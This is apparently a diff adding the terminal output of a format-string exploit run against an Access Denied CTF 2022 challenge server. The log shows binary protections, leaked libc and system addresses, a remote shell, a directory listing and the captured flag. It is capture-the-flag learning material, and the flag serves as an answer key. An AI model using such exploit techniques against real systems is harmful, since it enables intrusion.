@@ -1,0 +1,35 @@
+mito@ubuntu:~/CTF/Access_Denied_CTF_2022/Pwn_format/format$ python solve.py r
+[*] '/home/mito/CTF/Access_Denied_CTF_2022/Pwn_format/format/format'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[x] Opening connection to 107.178.209.165 on port 9337
+[x] Opening connection to 107.178.209.165 on port 9337: Trying 107.178.209.165
+[+] Opening connection to 107.178.209.165 on port 9337: Done
+[*] '/home/mito/CTF/Access_Denied_CTF_2022/Pwn_format/format/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+read_addr   = 0x7f5d1ada5020
+libc_base   = 0x7f5d1ac95000
+system_addr = 0x7f5d1ace4420
+[*] Switching to interactive mode
+
+              @-------0@@sh: 1: Enter: not found
+$ id
+/bin/sh: 1: id: not found
+$ ls -l
+total 44
+drwxr-x--- 1 0 1000  4096 Jun 10 11:41 bin
+drwxr-x--- 1 0 1000  4096 Jun 10 11:41 dev
+-rwxr----- 1 0 1000    51 Jun 11 06:51 flag.txt
+-rwxr-x--- 1 0 1000 16960 Jun 11 06:45 format
+drwxr-x--- 1 0 1000  4096 Jun 10 11:41 lib
+drwxr-x--- 1 0 1000  4096 Jun 10 11:41 lib32
+drwxr-x--- 1 0 1000  4096 Jun 10 11:41 lib64
+$ cat flag.txt
+accessdenied{f0rm4t_str1n9_sh3ll_3xpl01t_939d562c}
